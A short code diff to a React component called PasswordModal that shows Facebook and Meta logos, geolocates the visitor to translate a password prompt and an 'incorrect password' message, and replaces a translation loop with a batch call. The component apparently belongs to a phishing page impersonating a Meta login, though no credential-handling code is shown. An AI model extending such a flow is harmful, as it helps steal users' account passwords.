@@ -2,7 +2,7 @@ import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import translateText from '@/utils/translate';
+import { translateBatch } from '@/utils/translate';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -31,12 +31,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const textsToTranslate = ['Password', "The password that you've entered is incorrect.", 'Continue'];
 
         const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
+            const translatedMap = await translateBatch(textsToTranslate, geoInfo.country_code);
             setTranslations(translatedMap);
         };
 
